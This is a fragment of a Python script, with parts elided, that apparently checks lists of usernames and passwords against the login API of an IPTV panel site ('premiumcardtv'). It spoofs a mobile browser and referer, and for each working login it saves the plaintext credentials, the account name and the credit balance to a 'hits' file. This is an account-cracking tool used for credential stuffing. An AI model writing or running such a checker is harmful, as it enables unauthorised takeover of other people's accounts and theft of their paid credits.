...
def login_and_get_dashboard(username, password):
    login_url = 'https://premiumcardtv.cmsz.site/sys/api.php'
    login_headers = {
    ...
    try:
        with requests.Session() as session:
            ...
            dashboard_url = 'https://premiumcardtv.cmsz.site/dashboard'
            dashboard_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://premiumcardtv.brtv.me/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
...
def process_account(user, password, i, total):
    ...
    if name and credits:
        ...
        with open("/content/drive/MyDrive/_Paineis/hits/premiumcard_tv_hits.txt", "a") as hit_file:
            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
        return True
    else:
